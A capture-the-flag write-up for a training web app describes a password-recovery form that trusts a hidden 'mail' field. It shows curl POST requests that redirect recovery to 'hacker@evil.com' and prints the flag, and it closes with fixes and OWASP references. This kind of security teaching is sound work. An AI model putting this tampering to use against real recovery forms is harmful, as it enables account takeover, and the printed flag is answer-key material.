# Password Recovery - Hidden Mail Field Manipulation

## Breach Type
**Broken Access Control / Insecure Password Recovery** — OWASP Top 10: A07:2021 Identification and Authentication Failures

## What is this Vulnerability?
**Insecure Password Recovery** is a vulnerability where the password reset mechanism can be manipulated to send recovery credentials to an attacker-controlled email address instead of the legitimate user's email.

In this case, the recovery form stores the destination email in a **hidden HTML field** (`<input type="hidden" name="mail" value="webmaster@borntosec.com">`). The server blindly trusts this client-side value and sends the recovery information to whatever email address is in the form — without checking if it matches the account on file.

This is a fundamental design flaw: the recovery email should **never be provided by the client**. It should be looked up server-side from the user's account record. Putting it in a hidden field is like writing your bank's vault combination on a sticky note and trusting no one will read it.

### Why is it dangerous?
- **Account takeover**: Attacker receives the recovery email and resets the victim's password
- **Mass account compromise**: Automated scripts can target every user account
- **Privilege escalation**: If applied to admin accounts, the attacker gains full control
- **No trace**: The legitimate user may not know their account was compromised until it's too late

### Real-world impact
Insecure password recovery has led to numerous celebrity and political account hacks. High-profile cases include the 2014 iCloud celebrity photo leak where weak recovery mechanisms were exploited.

## Where
URL: `http://<IP>/?page=recover`
The "Forgot Password" / "I forgot my password" recovery form.

## How I Found It
1. Navigated to the **Sign In** page (`?page=signin`) and clicked the "I forgot my password" link.
2. This leads to the recovery page (`?page=recover`).
3. The page shows a "Submit" button but no visible email input field.
4. Inspected the page source and found a **hidden input field**:
   ```html
   <input type="hidden" name="mail" value="webmaster@borntosec.com">
   ```
5. The server sends the recovery email to whatever address is in the `mail` field — without any server-side validation.

## Step-by-Step Exploitation

### Step 1: Inspect the Form
```html
<form action="#" method="POST">
    <input type="hidden" name="mail" value="webmaster@borntosec.com">
    <input type="submit" name="Submit" value="Submit">
</form>
```

### Step 2: Change the Email and Submit
Using curl, change the mail parameter to any email:
```bash
curl -X POST "http://<IP>/?page=recover" -d "mail=hacker@evil.com&Submit=Submit"
```

### Step 3: Get the Flag
The server responds with the flag:
```
The flag is 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
```

## Flag
```
1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
```

## How to Test Manually
1. Open `http://<IP>/?page=recover`
2. Right-click on the **Submit** button → **Inspect Element**
3. Look for the hidden `<input type="hidden" name="mail" value="webmaster@borntosec.com">`
4. Change `value="webmaster@borntosec.com"` to `value="your-email@example.com"`
5. Click Submit
6. The flag appears

**Or using curl:**
```bash
curl -X POST "http://<IP>/?page=recover" -d "mail=anything@test.com&Submit=Submit"
```

## How to Fix
- **Never include the target email in a client-side hidden field** — the server should look up the recovery email from the database based on the username/account
- Use a **server-side association** between accounts and recovery emails
- Require the user to enter their **username or email** in a visible field, then send recovery to the email on file
- Implement **rate limiting** on password recovery endpoints
- Add **CAPTCHA** to prevent automated abuse
- Use **secure token-based recovery** (send a unique token via email, not the password)

## OWASP Reference
- [Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
- [Authentication Failures](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
